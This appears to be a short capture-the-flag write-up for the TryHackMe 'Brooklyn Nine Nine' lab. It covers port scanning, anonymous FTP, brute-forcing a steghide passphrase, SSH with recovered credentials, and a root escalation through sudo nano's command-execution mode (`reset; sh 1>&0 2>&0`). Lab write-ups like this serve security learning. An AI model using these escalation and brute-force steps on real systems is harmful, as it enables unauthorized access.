#ctf #tryhackme
# Brooklyn Nine Nine
---

## Nmap
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))

## Feroxbuster/Gobuster
Found nothing interesting
/server-status (Status: 403)

Open the URL in browser
Found a page with image on it

Inspecting page source
> <!-- Have you ever heard of steganography? -->

Downloade image and use steghide to find password

## FTP
Anonymous login is allowed
`ftp <machine-ip>`

Found 1 file: note\_to\_jake.txt
Download it to attacker machine and cat

> From Amy,
> 
> Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine

Two user:
    - Amy
    - Jake
    - holt (?)

try ssh brute forcing on user Jake

## Steghide
Need a passphrase to extract info

Using stegcracker/stegbrute to brute force password
Successful :o

Password found: admin

> Holts Password:
> fluffydog12@ninenine
> 
> Enjoy!!


Try to ssh using creds holt:fluffydog12@ninenine
Success. Gained shell

found 2 files:
-rw------- 1 root root 110 May 18  2020 nano.save
-rw-rw-r-- 1 holt holt  33 May 17  2020 user.txt

run `sudo -l`
> User holt may run the following commands on brookly\_nine\_nine:
>    (ALL) NOPASSWD: /bin/nano

means holt can run nano as root
`sudo /bin/nano` -> this will open nano as root
now press ctrl+r and ctrl+x to go into execute command mode
now run `reset; sh 1>&0 2>&0`

Gained root shell (within nano)
cd to /root to find root.txt

[DONE]
